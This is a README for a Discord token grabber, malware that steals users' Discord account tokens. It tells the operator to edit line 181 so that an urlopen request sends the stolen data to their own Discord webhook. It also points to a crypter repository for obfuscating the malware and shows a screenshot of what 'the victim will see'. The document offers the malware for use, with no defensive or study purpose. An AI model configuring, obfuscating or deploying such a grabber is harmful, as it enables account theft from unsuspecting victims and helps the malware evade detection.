
# Discord-Token-Grabber

Simple token grabber for discord (the token grabber code is not mine but I made some small changes)
- [@wodxgod](https://github.com/wodxgod) Author of the base code


## How to use

To use the token grabber modify line 181

from:
```bash
  urlopen(Request("Webhook", data=dumps(webhook).encode(), headers=getheaders()))
```
to:
```bash
  urlopen(Request("https://discord.com/api/webhooks/...", data=dumps(webhook).encode(), headers=getheaders()))
```




## How to obfuscate/crypt

[Refer to this repository](https://github.com/PushpenderIndia/crypter)


## Screenshots
 The victim will see this screen
![App Screenshot](https://i.imgur.com/csrd4jY.png)




